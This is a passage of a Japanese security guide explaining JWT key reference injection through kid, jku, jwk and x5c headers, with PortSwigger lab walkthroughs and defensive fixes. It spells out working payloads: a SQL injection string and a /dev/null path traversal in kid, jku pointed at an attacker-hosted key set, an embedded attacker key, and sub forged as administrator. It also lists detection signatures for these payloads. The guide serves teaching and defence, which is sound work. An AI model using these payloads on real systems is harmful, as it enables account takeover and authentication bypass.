つまりサーバはヘッダをBase64urlデコードした時点で `kid` や `jku` の値を読み取り、それを手がかりに検証鍵を取りに行く。この段階ではまだ署名の正当性は一切確認されていない。にもかかわらず、その値は攻撃者が完全に制御できる。攻撃者が「どの鍵で検証させるか」を指定できるということは、**攻撃者が自分の知っている鍵・自分が用意した鍵で検証させられる**ことを意味する。これがキー参照インジェクションの本質である。

### この攻撃クラスの前提条件——なぜ「静的な鍵」で済まないのか

「そんな危険なフィールドを読むな」で済むなら苦労はない。だが現実のシステムには、キー参照を動的に解決せざるを得ない構造的な事情がある。

- **マルチテナントアプリ**: テナント（顧客）ごとに別々の署名鍵を使う設計では、トークンを受け取った瞬間に「どのテナントの鍵で検証すべきか」を動的に決める必要がある。その手がかりとして `kid` を使うのは自然な発想である。
- **外部発行のJWTを受け入れるアプリ**: サードパーティが発行したトークンを受理する場合、鍵は自分の手元にない。
- **複数のIssuer（発行者）を束ねるAPIゲートウェイ**: 複数の発行元からのJWTを検証するゲートウェイは、静的な単一鍵では回らず、動的な鍵解決が必須になる。

このように「動的な鍵解決が構造的に強制される」場所こそが攻撃面になる。以降、フィールドごとに攻撃機構を見ていく。

### kid（Key ID）——SQLインジェクションとパストラバーサルの侵入口

`kid`（Key ID）はRFC 7517 4.5節で「大文字小文字を区別する文字列で、フォーマットの決まりはない。構造は開発者が自由に選ぶ」と定義されている。要するに「検証鍵を一意に識別するためのラベル」であり、**その形式に一切の制約がない**。この「開発者任せ」という緩さが、そのまま脆弱性の温床になる。

サーバは典型的に、`kid` の値を使ってデータベースやファイルシステムから鍵を引く。ここで `kid` を**サニタイズ（無害化）せずに**クエリやファイルパスへ埋め込むと、`kid` は「鍵を識別するデータ」から「クエリやパスを制御する命令」へと格上げされてしまう。

#### kid経由のSQLインジェクション

脆弱なパターンは次のように、`kid` を文字列連結でSQLに埋め込むものだ。

```sql
SELECT key FROM keys WHERE kid = '<ヘッダから取り出したkidの値>'
```

攻撃者は `kid` にSQLメタ文字を注入する。

```
' UNION SELECT 'attacker_secret'-- -
```

このペイロードを埋め込むと、実際に実行されるクエリは次のようになる。

```sql
SELECT key FROM keys WHERE kid = '' UNION SELECT 'attacker_secret'-- -'
```

**なぜこれで検証が通るのか**を仕組みから説明する。`UNION SELECT 'attacker_secret'` によって、データベースはリテラル文字列 `attacker_secret` を「鍵」として返す。サーバはこれをHMAC（共通鍵ハッシュによる署名方式。同じ鍵を知っていれば誰でも署名を作れて検証もできる）の**検証鍵**として使う。ところがこの鍵は攻撃者自身が選んだ文字列だ。攻撃者は同じ `attacker_secret` を使って、偽造したペイロード（例: `sub` を管理者に書き換えたもの）にHMAC署名を付け直せる。両者が**同じ鍵材料**を使うため、署名は数学的に正当なものとして検証を通過する。

別解として `' OR '1'='1` を使えば、`keys` テーブルの最初の行が返る。攻撃者が最初の行の鍵値を知っている、あるいは `ORDER BY 1` で並び順を強制して既知の鍵を先頭に来させられる場合に成立する。

この脆弱性はCWE-89（SQLインジェクション）とCWE-287（不適切な認証）を併せ持ち、記事はCVSS 3.1で **7.5 High** と評価している。ネットワーク越しにアクセス可能で、認証不要、かつ認証の完全性への影響が全面的だからだ。

#### kid経由のパストラバーサル

鍵をファイルから読む実装も同じ罠を抱える。次はNode.jsの脆弱なパターンだ。

```javascript
const key = fs.readFileSync(`/keys/${kid}`);
```

攻撃者は `kid` にパストラバーサル列（`../`）を注入し、読み取り先をすり替える。

```
../../../../dev/null
```

**なぜ `/dev/null` を狙うのか**。`/dev/null` はUnix系OSで「読むと常に空（ゼロバイト）を返す」特殊ファイルである。ここから導出されるHMAC鍵は**ゼロ長のバイト列**になる。攻撃者は、この「空の鍵」に一致する鍵材料で自分のトークンに署名すればよい。具体的には、JWKの `k` パラメータ（HMAC鍵をBase64urlで表した値）を `AA==`（1バイトのヌルバイトのBase64url表現）に設定して署名する。サーバが `/dev/null` から導く鍵材料と、攻撃者が使う鍵材料が一致するため、署名検証は通る。

これはPortSwigger（Web Security Academy）のラボでも定番の手口で、`kid` を `../../../../dev/null` に、`sub` を `administrator` に書き換え、`k=AA==` で署名すると `/admin` にアクセスできる、という形で登場する。

> ⚠️ **スコープ注意**: 本節は防御目的の解説である。ここで示す `sub` の書き換えやパス注入は、あなた自身が管理する検証環境・意図的に用意された学習用ラボに対してのみ行うこと。実在サービスや本番環境への無許可の検証は行わない。

パストラバーサルもCVSS 3.1で **7.5 High**（CWE-287）、SQLインジェクションと同等の影響範囲である。

#### 両攻撃に共通する原理——「同じ鍵に、別々の経路でたどり着く」

SQLインジェクションとパストラバーサルは表面的には別物だが、成立の原理は同一である。**攻撃者とサーバが、異なる経路をたどって最終的に同一の暗号鍵に到達する**点だ。

- **SQLインジェクション**: 攻撃者が `attacker_secret` を選ぶ → DBがそれを返す → サーバがそれで検証する。
- **パストラバーサル**: 攻撃者がヌルバイト鍵で署名する → サーバが `/dev/null`（ヌルバイト）を読む → 双方が同一のHMAC鍵材料に到達する。

署名が「数学的に正しい」と判定されるのは、両者が同じ鍵を使ったからにほかならない。署名アルゴリズムは何も間違っていない。間違っているのは「攻撃者に鍵を選ばせた」という前段の設計である。

### jku（JWK Set URL）——「鍵を取りに行く先」を乗っ取る

`jku`（JWK Set URL）は、「公開鍵をこのURLから取ってこい」とサーバに指示するヘッダである。JWK Set（複数のJWKをまとめたJSON文書、通称JWKS）を配信するエンドポイントを指す。

攻撃機構は単純明快だ。

```
攻撃者が支配: https://evil.example/jwks.json
そのJWK Setには攻撃者自身のRSA公開鍵が入っている
jku ヘッダを evil.example に向ける
攻撃者の秘密鍵で署名したトークンが検証を通過する
```

**なぜ通るのか**。RS256のような公開鍵署名では、検証側は公開鍵さえ持てば署名を検証できる。サーバが `jku` の指す先を無条件に信頼してJWKSを取得すると、そこには攻撃者が生成したRSA鍵ペアの**公開鍵**が置いてある。攻撃者は対応する**秘密鍵**で偽トークンに署名しているので、サーバが取得した公開鍵で検証すれば当然パスする。鍵ペア丸ごとが攻撃者のものだから、署名は完全に正当である。

歴史的な実例として **CVE-2018-0114**（node-jose の 0.11.0 未満、CVSS 8.1 High）がある。これはトークンヘッダに埋め込まれたJWKを検証にそのまま信用してしまい、鍵の完全なすり替えを許した。

---

### jwk（JSON Web Key）——公開鍵をヘッダに「同梱」させる

`jwk` は公開鍵を**JWTヘッダ内に直接埋め込む**フィールドである。`jku` が「URLで取りに行かせる」のに対し、`jwk` は「鍵そのものをトークンに同梱する」。攻撃者にとってはさらに手軽だ。外部サーバを用意する必要すらない。

```
ヘッダ: {
  "alg": "RS256",
  "jwk": { ここに攻撃者の公開鍵 }
}
署名: 攻撃者の秘密鍵で作成
```

攻撃者はRSA鍵ペアを生成し、公開鍵を `jwk` に入れ、対応する秘密鍵でトークンに署名する。サーバが「埋め込まれた鍵の素性」を疑わずにそのまま検証鍵として使えば、検証は通る。要は「鍵を持ってきたのは誰か」を問わない実装が敗因である。

---

### x5u／x5c——証明書版の同型攻撃

`x5u` と `x5c` はX.509証明書ベースの変種である。`x5u` は証明書チェーンをURLで指し示し（`jku` の証明書版）、`x5c` は証明書チェーンをヘッダに埋め込む（`jwk` の証明書版）。攻撃の型はまったく同じで、「外部にある、あるいは埋め込まれた鍵材料が攻撃者の制御下に置ける」ことが問題の核心である。`x5c` を扱う場合は、埋め込まれた証明書の署名者チェーンを検証せず末端の公開鍵だけ取り出して使う、といった実装がしばしば穴になる。

### フィンガープリンティング——ヘッダのどのフィールドがあるかで攻撃を切り替える

記事が繰り返し強調するのは、「**攻撃はヘッダのフィンガープリント（指紋）で決まる**」という点だ。テストの通るJWTと報酬につながるJWTの差は、ガイドが『オプション』と呼ぶそのフィールドにある。診断の手順は次の3段階で整理できる。

**ステップ1: デコード（暗号処理不要）**。ヘッダをBase64urlデコードし、存在する全パラメータを記録する。この段階では鍵も署名も要らない。

**ステップ2: フィンガープリンティング**。ヘッダに含まれるフィールドで分類する。

- `kid` がある → SQLインジェクションとパストラバーサルを試す
- `jku` がある → 外部への取得（out-of-band fetch）が起きるか確認する
- `jwk` がある → 攻撃者の鍵ペアで試す
- どれも無い → `alg: none` と RS256→HS256 混同を試す

**ステップ3: 注入と観察**。対応するプリミティブを実行し、応答を観察する。記事の目安では、`HTTP 200` = バイパス成立、`HTTP 401` = アルゴリズム強制で防がれた、`HTTP 400` = 注入面が存在する（パーサがエラーを返した）ことの示唆、と解釈する。

**実運用上の重要な注意**として、多くのWAF（Web Application Firewall）は**JWTヘッダの中身をデフォルトでは検査しない**。`kid` に含まれる `../` や `UNION` を検出するには、WAF側でヘッダをBase64urlデコードしてからルールを適用する必要がある。逆に言えば、攻撃者にとってJWTヘッダは検査の目をすり抜けやすい経路である。検出のためのシグネチャ例としては、パス区切り（`../`, `%2F`, `%2e%2e`）やSQLメタ文字（`'`, `"`, `--`, `UNION`, `SELECT`, `OR`）が `kid` に現れることが挙げられる。

なお影響の実例として、記事はLinktreeの事例（HackerOne #1760403）に触れ、「JWTクレーム操作による完全なアカウント乗っ取り」が実証されたと述べている。マルチテナント環境では、権限昇格やテナント境界の越境が直接の帰結になる。

> 出典: DEV: JWT Key Reference Injection: The Attack Class That Wins Bounties While Guides Miss It — https://dev.to/roxdavirox/jwt-key-reference-injection-the-attack-class-that-wins-bounties-while-guides-miss-it-421

### 防御——「攻撃者に鍵を選ばせない」ための具体策

これらの脆弱性は**JWT仕様そのものの欠陥ではない**。仕様が許容する柔軟性を、コードベースが「検証なしの信頼」として受け継いでしまうことが原因である。記事いわく、修正はおよそ10行程度で済むにもかかわらず、悪用は単一ヘッダの改変だけで成立する。以下の対策を層状に組み合わせる。

#### 対策1: パラメータ化クエリ（SQLインジェクション対策）

`kid` を文字列連結でSQLに埋めるのをやめ、プレースホルダを使う。

```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT key FROM keys WHERE kid = ?"
);
stmt.setString(1, kid);
```

プレースホルダ（`?`）を使うと、ユーザ入力は**クエリの構造には一切触れず**、データベースは `kid` を常に「データ」として扱い「コード」としては解釈しない。これでSQLインジェクションは原理的に成立しなくなる。

#### 対策2: パスの検証とホワイトリスト（パストラバーサル対策）

ファイルから鍵を引く場合は、`kid` を許可リストで照合し、パス操作を無効化する。

```javascript
const allowedKids = new Set(['key-2024-01', 'key-2024-02']);
const safeKid = path.basename(kid);              // ディレクトリ成分を除去
if (!allowedKids.has(safeKid)) throw new Error('Invalid kid');
```

`/`, `\`, `..`, `%2f`, `%2e` を含む `kid` は無条件で拒否する。形式は正規表現 `^[a-zA-Z0-9_-]{1,64}$` やUUID形式に限定する。そして**「不正なkidのときにデフォルト鍵へフォールバックする」実装は絶対に作らない**。フォールバックはそれ自体がバイパスの温床になる。

#### 対策3: アルゴリズムのピン留め（alg固定）

鍵を引く**前に** `alg` クレームを検証し、期待するアルゴリズムに固定する。RS256やES256は公開鍵署名なので、攻撃者は公開鍵しか持たず、RSA/ECDSA署名を偽造できない。したがって「空のHMAC鍵」による攻撃（パストラバーサルの `/dev/null` 系）に対して原理的に耐性がある。逆に、HMAC系（HS256など）を許すと、公開鍵を鍵材料に転用する混同攻撃の余地が残る。サーバは「受理するアルゴリズムの集合」を明示的に固定し、ヘッダの `alg` 宣言を鵜呑みにしない。

#### 対策4: jku／jwk／x5u／x5c の出所を制限する

- `jku`/`x5u`: 取得先URLを**信頼できるドメインの許可リスト**に限定する。任意ドメインへの取得（SSRF的挙動）を許さない。
- `jwk`/`x5c`: ヘッダに埋め込まれた鍵・証明書を**検証鍵として無条件に信頼しない**。埋め込まれた鍵が事前に登録された信頼済み鍵と一致するか、証明書チェーンが信頼されたCAまで正しく辿れるかを確認する。可能なら、そもそも外部・埋め込みの鍵参照を無効化し、**サーバ側で静的に管理する鍵リストのみ**を使う。

#### 対策5: 鍵管理の外部化

AWS KMSやHashiCorp Vaultのような鍵管理サービス（KMS）を使えば、生のSQLやファイルベースの鍵引きそのものを設計から排除できる。鍵の取得口が固定され、攻撃者が制御できる「参照文字列」がそもそも介在しなくなる。

### まとめ

キー参照インジェクションは、`alg: none` やアルゴリズム混同ほど有名ではないが、実務で最も報酬に直結する攻撃クラスの一つである。核心は次の一文に集約される。

- **キー参照フィールド（`kid`／`jku`／`jwk`／`x5u`／`x5c`）は署名検証よりも前に、しかも攻撃者制御下の値として処理される。**
- 結果として攻撃者は「どの鍵で検証させるか」を選べ、`kid` ではSQLインジェクション／パストラバーサルで既知・空の鍵に、`jku`/`jwk`/`x5u`/`x5c` では自分の鍵ペアに、それぞれサーバを誘導できる。
- 署名アルゴリズムは終始正しく動いている。破綻しているのは「攻撃者に鍵選択を委ねた」前段の信頼設計である。

防御の要は「攻撃者に鍵を選ばせない」ことに尽きる。パラメータ化クエリ、パスのホワイトリスト、`alg` のピン留め、`jku`/`jwk` の出所検証、そして鍵管理の外部化——これらを層状に重ねることで、たった数行の追加で単一ヘッダによる乗っ取りを封じられる。

## PortSwigger JWTハンズオンラボ

前節までにJWT（JSON Web Token）の構造と署名検証の基本原理を学んだ。本節では、その知識を土台に、PortSwiggerが提供する3本の代表的なハンズオンラボ——`kid`ヘッダーのパストラバーサル、`jku`ヘッダーインジェクション、`jwk`ヘッダーインジェクション——を取り上げ、それぞれがJWT検証ロジックのどの前提を破壊することで認証バイパスに至るのかを、仕組みのレベルまで掘り下げて解説する。3本に共通するのは「署名アルゴリズムそのものは正しく実装されているにもかかわらず、"どの鍵で検証するか"をサーバーに決めさせるためのヒント情報（ヘッダーパラメータ）を、攻撃者が改ざんできてしまう」という一点である。JWTの署名検証は本来「サーバーが最初から知っている、信頼された鍵」を使って行われるべきものだが、ここで扱う3つの脆弱性はいずれも、その"鍵の出所"の決定権を、トークンを送りつける側（攻撃者）に明け渡してしまっている実装ミスに起因する。

### 1. なぜ「どの鍵で検証するか」がJWTの攻撃対象になるのか

JWTの署名検証は、概念的には次の2ステップで構成される。

1. サーバーが「この署名を検証するために使うべき鍵」を決定する
2. その鍵を使って、受け取ったトークンの署名が正しいかどうかを計算・比較する

ステップ2は暗号学的に堅牢な処理であり、鍵さえ正しければ改ざんは検出される。問題はステップ1である。RFC 7515（JSON Web Signature）は、検証鍵をサーバーに示唆するためのヘッダーパラメータとして`kid`（Key ID）・`jku`（JWK Set URL）・`jwk`（埋め込みJWK）・`x5u`（X.509 URL）・`x5c`（埋め込みX.509証明書）などを定義している。これらはいずれも「利便性のためのヒント」であり、本来はサーバー側で厳格な検証・制約を通さなければならない。しかし実装によっては、これらのヘッダー値を"そのまま鵜呑みにして"鍵を取得してしまう。JWTのヘッダー部分はBase64URLエンコードされているだけで暗号学的な保護は一切受けていないため、攻撃者は署名前に自由にヘッダーの中身を書き換えられる。つまり「鍵の在り処を指し示す値」自体を攻撃者が握っている以上、サーバーがその値を無条件に信頼した瞬間、検証プロセス全体が攻撃者の制御下に落ちる。これが3本のラボに共通する構造である。

### 2. ラボ1: `kid`ヘッダーパストラバーサルによるJWT認証バイパス

#### 2.1 `kid`パラメータとその想定用途

`kid`（Key ID）は、サーバーが複数の署名鍵をローテーションしながら運用している場合に、「このトークンはどの鍵で署名されたか」をサーバーに伝えるためのヒントである。サーバーは通常、`kid`の値をキーとして、あらかじめ用意された鍵のマップ（データベースのレコードや、メモリ上の辞書など）を引き、対応する鍵を取り出して検証に使う。

#### 2.2 脆弱な実装:`kid`をファイルパスとして直接使用する

このラボが再現する実装ミスは、サーバーが`kid`の値を「ファイルシステム上の鍵ファイルへの相対パス」として直接解釈し、そのままファイルを読み込んで署名鍵として使用してしまうというものである。たとえば正規の実装では次のようなコードが動いていると想定できる（擬似コード）。

```
key_path = "/app/keys/" + jwt_header["kid"]
key = read_file(key_path)
verify_signature(token, key)
```

ここで`kid`の値に対する検証・サニタイズが一切行われていない場合、攻撃者は`kid`にパストラバーサルシーケンス（`../`を連ねて親ディレクトリへ遡る手法）を注入し、鍵ファイル以外の"内容が既知の任意のファイル"を指定できる。

#### 2.3 攻撃手順

1. **既知の内容を持つファイルを鍵として指定する**。Linuxシステムには`/dev/null`という、読み込むと常に空（0バイト）を返す特殊デバイスファイルが存在する。`kid`を次のように書き換える。

```json
{
  "kid": "../../../../../../../dev/null",
  "alg": "HS256"
}
```

パストラバーサルシーケンスを十分な回数（ルートディレクトリに到達するまで）繰り返すことで、アプリケーションのカレントディレクトリがどこであっても確実に`/dev/null`へ到達できる。

2. **サーバーが`/dev/null`の中身（空文字列）を鍵として読み込むことを利用し、攻撃者側もまったく同じ「空文字列」を秘密鍵としてJWTに署名する**。HS256（HMAC-SHA256）は対称鍵アルゴリズムであり、署名と検証に同じ鍵を使う。攻撃者は自分の手元で、鍵の中身を空文字列に設定したJWTを新たに作成・署名すればよい。

3. **ペイロードを改ざんする**。認証バイパスの目的に応じて、たとえば`sub`（subject、トークンの主体を表すクレーム）を`administrator`に書き換える。

```json
{
  "sub": "administrator",
  "exp": 1719999999
}
```

4. **空文字列鍵でHMAC署名を再計算し、改ざんしたヘッダー・ペイロードとともにサーバーへ送信する**。

サーバー側の処理は次のようになる。

- サーバーは受け取ったヘッダーの`kid`（`../../../../../../../dev/null`)を読み、`/app/keys/` などの想定ディレクトリからの相対パスとしてこれを結合する
- パス正規化の結果、実際に開かれるファイルは`/dev/null`となり、その中身（空文字列）が「検証用の秘密鍵」として使われる
- サーバーは、この空文字列鍵でトークンのHMAC署名を再計算し、送られてきた署名と比較する
- 攻撃者も同じ空文字列鍵で署名しているため、両者は一致し、検証は成功する

結果として、攻撃者は`administrator`になりすましたトークンを、サーバーに正当なものとして受理させることに成功する。

#### 2.4 なぜこの攻撃が成立するのか(仕組みレベル)

この攻撃の本質は「パストラバーサル」と「対称鍵署名の性質」の組み合わせにある。HMACベースの署名（HS256など)は対称鍵方式であるため、鍵さえ入手すれば誰でも正当な署名を生成できる。サーバーが鍵の"在り処"を外部入力（`kid`)に依存し、かつそのパスの正規化・検証を行っていない場合、攻撃者は「サーバーが読み込む鍵ファイルのパス」を、内容が事前にわかっている任意のファイルへとすり替えられる。`/dev/null`は最も分かりやすい例だが、要点は「攻撃者がその中身を知っている、あるいは自由に用意できるファイルを鍵として使わせること」にある。つまりこの脆弱性は暗号アルゴリズム自体の欠陥ではなく、「鍵管理を外部からの文字列入力に委ねてしまった」というアクセス制御・入力検証の欠陥である。

> 出典: JWT authentication bypass via kid header path traversal | Web Security Academy — https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal

#### 2.5 対策

- `kid`の値をファイルパスとして直接使わない。あらかじめ用意したホワイトリスト（許可された鍵IDの集合）と照合し、一致した場合のみ対応する鍵をコード側の固定マップから取り出す設計にする。
- 鍵をファイルシステムから動的に読み込む構成自体を避け、秘密鍵管理システム(KMS)やデータベースなど、パス文字列を外部入力から組み立てない仕組みで管理する。
- 万一パスを組み立てる必要がある場合は、`../`などの相対パス表記を拒否し、正規化後のパスが想定ディレクトリの外に出ていないことを厳格に検証する。

### 3. ラボ2: `jku`ヘッダーインジェクションによるJWT認証バイパス

#### 3.1 `jku`パラメータとその想定用途

`jku`（JWK Set URL）は、「この署名を検証するための公開鍵は、このURLが返すJWKセット（JSON Web Key Set、複数の公開鍵をJSON配列としてまとめた形式）の中にある」とサーバーに伝えるヘッダーパラメータである。これはRS256のような非対称鍵アルゴリズムと組み合わせて使われることが多い。サーバーはトークンを検証する際、`jku`が指すURLへHTTPリクエストを送り、返ってきたJWKセットの中から`kid`に一致する鍵を選んで検証に使う、という流れになる。

#### 3.2 脆弱な実装:URLの出所を検証せずに鍵を取得する

このラボの脆弱性は、サーバーが`jku`に指定されたURLがどこであっても無条件にフェッチし、そこで得たJWKセットを信頼して署名検証に使ってしまう点にある。本来、鍵の取得元は「自社が管理する、あらかじめ信頼されたドメイン」に限定されているべきだが、その制約(ドメインのホワイトリスト検証)が欠落している。

#### 3.3 攻撃手順

1. **攻撃者自身のRSA鍵ペアを生成する**。Burp Suiteの「JWT Editor」拡張機能などを使い、新しいRSA鍵ペアをローカルで作成する。

2. **公開鍵をJWKセット形式で自分の管理下にあるサーバー(またはBurp Collaboratorのようなリクエストキャプチャ用エンドポイント)にホストする**。JWKセットの形式は次のようになる。

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "attacker-key-1",
      "n": "xGOr-H7A-PWG7...(攻撃者の公開鍵のモジュラス)"
    }
  ]
}
```

3. **標的のJWTのペイロードを改ざんする**。たとえば`sub`クレームを`administrator`に書き換える。

4. **ヘッダーの`jku`を、攻撃者がホストしたJWKセットのURLに書き換え、`kid`をそのJWKセット内のキーIDに合わせる**。

```json
{
  "kid": "attacker-key-1",
  "alg": "RS256",
  "jku": "https://attacker.example.net/jwks.json"
}
```

5. **攻撃者自身の秘密鍵でトークンに署名し直し、サーバーに送信する**。

サーバー側では次の処理が起きる。

- ヘッダーの`jku`を読み取り、そのURL(攻撃者のサーバー)へHTTPリクエストを送ってJWKセットを取得する
- 取得したJWKセットの中から、ヘッダーの`kid`と一致する公開鍵を選ぶ(攻撃者が用意した鍵そのもの)
- その公開鍵でRSA署名を検証する。攻撃者はこの公開鍵とペアになる秘密鍵で署名しているため、検証は成功する

結果として、サーバーは「自分がフェッチしにいったURLの先に何が置かれているか」を一切検証していないため、攻撃者は"サーバーに自分の公開鍵を信頼させる"ことに成功し、任意のクレームを持つトークンを正当なものとして通してしまう。

#### 3.4 なぜこの攻撃が成立するのか(仕組みレベル)

RS256のような非対称鍵署名は「秘密鍵を知っている者しか正しい署名を作れない」という前提のもとで安全性が担保されている。しかしこの安全性は、あくまで「検証に使われる公開鍵が、本当に"正規の署名者"のものである」という前提の上に成り立つ。`jku`インジェクションは、この"公開鍵の出所の正当性"という前提を丸ごと攻撃者の手に委ねてしまう。サーバーが「どのURLから鍵セットを取得するか」を外部入力(ヘッダー)に任せ、そのURLがどこであってもフェッチするならば、攻撃者は自分の鍵ペアを"正規の鍵"としてサーバーに登録させたのと事実上同じ状態を作り出せる。これは公開鍵基盤(PKI)における「信頼の起点(トラストアンカー)をどこに置くか」という設計上の問題そのものであり、`jku`検証の欠落は、そのトラストアンカーの決定権を攻撃者に渡してしまう欠陥だと言い換えられる。

> 出典: JWT authentication bypass via jku header injection | Web Security Academy — https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection

#### 3.5 対策

- `jku`ヘッダーの値を検証せずに使わない。あらかじめ登録された、信頼できるドメイン(自社のJWKセットホスティングURLなど)のホワイトリストと厳密に照合し、一致しない場合はトークンを拒否する。
- 可能であれば`jku`のような動的な鍵取得の仕組み自体を使わず、サーバー側にあらかじめ静的に配置・管理された鍵のみを使用する設計にする。
- JWKセットの取得を許すドメインをホワイトリストに限定するだけでなく、SSRF(Server-Side Request Forgery、サーバーに攻撃者の意図した任意の宛先へリクエストを送らせる攻撃)対策の観点からも、内部ネットワークやメタデータエンドポイントへのフェッチを防止するネットワークレベルの制御を併用する。

### 4. ラボ3: `jwk`ヘッダーインジェクションによるJWT認証バイパス

#### 4.1 `jwk`パラメータとその想定用途

`jwk`(埋め込みJWK)は、`jku`のように外部URLを参照するのではなく、検証に使う公開鍵そのものをJWTヘッダーの中に直接埋め込むためのパラメータである。これは、たとえば送信者が動的に鍵ペアを生成し、その都度公開鍵をトークンに同梱して渡すようなユースケースを想定した仕様だが、受信側が「ヘッダーに埋め込まれた鍵を無条件に信頼して検証に使う」実装になっていると、認証の根幹が崩れる。

#### 4.2 脆弱な実装:ヘッダー埋め込みの鍵をそのまま信頼する

このラボが再現する脆弱性は、サーバーが`jwk`ヘッダーに含まれる公開鍵情報を、その出所を一切確認せずに「この鍵で検証せよ」という指示としてそのまま受け入れてしまう点にある。これは`jku`インジェクションと本質的に同根の問題だが、外部へのHTTPフェッチすら不要で、攻撃者はJWTという1つのオブジェクトの中だけで、ペイロード改ざん・鍵の提示・署名のすべてを完結させられるという点でより単純である。

#### 4.3 攻撃手順

1. **攻撃者自身のRSA鍵ペアを新規に生成する**。

2. **標的のJWTのペイロードを改ざんする**。`sub`クレームを`administrator`に書き換えるなど、権限昇格を狙った変更を行う。

```json
{
  "sub": "administrator",
  "exp": 1719999999
}
```

3. **ヘッダーに`jwk`パラメータを追加し、攻撃者の公開鍵をJWK形式でそのまま埋め込む**。Burp SuiteのJWT Editor拡張機能には「Embedded JWK」という、生成した鍵ペアの公開鍵をワンクリックでヘッダーに埋め込み、対応する`kid`も自動設定してくれる機能がある。

```json
{
  "kid": "attacker-generated-key-id",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "attacker-generated-key-id",
    "n": "xGOr-H7A-PWG7VNoLcJZi...(攻撃者の公開鍵のモジュラス)"
  }
}
```

4. **攻撃者自身の秘密鍵でトークン全体(改ざん済みヘッダー+改ざん済みペイロード)に署名する**。

5. **改ざんしたJWTをサーバーへ送信する**。

サーバー側の処理は次のようになる。

- ヘッダーに`jwk`パラメータが存在することを検知し、そこに埋め込まれた公開鍵情報をそのまま検証鍵として採用する
- その公開鍵でRSA署名を検証する。攻撃者はこの公開鍵とペアの秘密鍵で署名しているため、検証は成功する

結果、攻撃者は`administrator`として振る舞うトークンを正当なものとしてサーバーに受理させ、たとえば管理者専用の削除エンドポイント(`/admin/delete?username=carlos`)のような機能を不正に実行できてしまう。

#### 4.4 なぜこの攻撃が成立するのか(仕組みレベル)

`jwk`インジェクションが露呈させているのは、「署名検証において、"誰が鍵を提示したか"と"その鍵が信頼に値するか"は別問題である」という原則の欠落である。RSAなどの非対称鍵署名アルゴリズムは、「秘密鍵の所有者だけが有効な署名を作れる」という数学的性質を持つが、この性質は「検証に使う公開鍵が信頼できる」という前提があってはじめて意味を持つ。攻撃者がトークン自身の中に自分の公開鍵を同梱し、サーバーがその鍵の出所(=それが送信者自身によって用意されたものであり、正規の発行者のものではないという事実)を確認せずに検証プロセスへ投入してしまえば、「送信者が自分で用意した鍵を、送信者が自分で正しいと証明する」という、検証としてまったく意味を成さない循環構造が成立してしまう。`kid`パストラバーサル・`jku`インジェクション・`jwk`インジェクションの3つは、攻撃の実装手段こそ異なるが、共通して「サーバーが鍵の出所の正当性を検証せず、トークン(あるいはそれに付随するヘッダー情報)自身に検証方法を指示させてしまっている」という同一の設計欠陥に帰着する。

> 出典: JWT authentication bypass via jwk header injection | Web Security Academy — https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection

#### 4.5 対策

- `jwk`ヘッダーに埋め込まれた鍵を検証用途で信頼しない。検証鍵は常にサーバー側があらかじめ保持・管理している既知の鍵セットからのみ取得する。
- JWTライブラリを選定・設定する際、`alg`・`kid`・`jku`・`jwk`・`x5u`といったヘッダーパラメータをアプリケーションコードが解釈して鍵選択に使う実装(いわゆる「アルゴリズム混同」や「鍵混同」系の脆弱性群の温床)を避け、検証時に許可するアルゴリズムと鍵を固定的に(ホワイトリストで)指定できるライブラリ機能を使う。
- サーバー側で、いかなる形であれ「トークン自身が指示する検証方法」を鵜呑みにしないという原則を徹底する。検証ロジックは常にサーバー側の信頼済み設定を起点にすべきであり、リクエストに含まれる情報を起点にしてはならない。

### 5. 3本のラボに共通する教訓

`kid`パストラバーサル・`jku`インジェクション・`jwk`インジェクションは、攻撃の見た目こそ「ファイルパスの細工」「外部URLの悪用」「鍵の直接埋め込み」とそれぞれ異なるが、根本原理はすべて同一である。すなわち、**JWTのヘッダーは署名によって保護されていない(署名検証の"前"に読まれる情報である)にもかかわらず、そのヘッダーの内容を使って"どうやって検証するか"をサーバーに決めさせてしまうと、検証プロセスそのものを攻撃者が乗っ取れる**、という構造的な弱点である。防御の要点は一貫しており、検証に使う鍵とアルゴリズムは常にサーバー側の固定された信頼済み設定から決定し、トークンに含まれる`kid`・`jku`・`jwk`などのヒント情報は、せいぜい「あらかじめ許可された選択肢の中から選ぶためのインデックス」としてのみ、ホワイトリスト越しに扱うべきである。次節では、これらの脆弱性を実際に発見・検証する際に使われるツール(Burp SuiteのJWT Editor拡張機能など)の使い方と、防御側の実装チェックリストを扱う。

## アルゴリズム混同ライトアップの読み解き

> ⚠️ **スコープの注記**: 本節は、公開されているライトアップ（PortSwigger 系ラボの攻略記録）を題材に、「アルゴリズム混同（algorithm confusion）」が**なぜ成立するのか**という仕組みを原理レベルで解説するものである。特定ラボのフラグ取得手順（具体的なクリック列・完成ペイロード）そのものは本書の目的ではないため再掲しない。手を動かす場合は、自分が所有・許可された環境（PortSwigger の無償ラボ等）で、原典に直接あたって行うこと。

本節では、JWTの署名検証をめぐる代表的な脆弱性クラスである「アルゴリズム混同」を、公開鍵が明示的にサーバーから配布されているケースと、配布されていないケースという2段階を通じて掘り下げる。目的は、「なぜRSAの公開鍵がHMACの秘密鍵として通用してしまうのか」という核心の仕組みを理解することにある。加えて、PortSwiggerの複数JWTラボを横断的に扱うMedium記事の論点も原理面から整理する。

### 1. 前提知識 — RS256とHS256の非対称性の違い

JWT（JSON Web Token）は、ヘッダー・ペイロード・署名の3部分を`.`で連結し、それぞれをBase64URLエンコードした文字列である。署名部分の生成方式は、ヘッダー内の`alg`（algorithm）クレームで指定される。代表的な2方式の違いは次の通りである。

- **HS256（HMAC-SHA256）**: 対称鍵アルゴリズム。1つの秘密鍵（シークレット）を、署名の生成にも検証にも同じ鍵として使う。サーバーだけがこの鍵を知っている前提が成り立つ。
- **RS256（RSA-SHA256）**: 非対称鍵アルゴリズム。秘密鍵（private key）で署名を生成し、公開鍵（public key）で検証する。設計思想として、公開鍵は「公開」してよい情報であり、これをクライアントに配布しても署名を偽造されることはない、という前提でRSAは成り立っている。

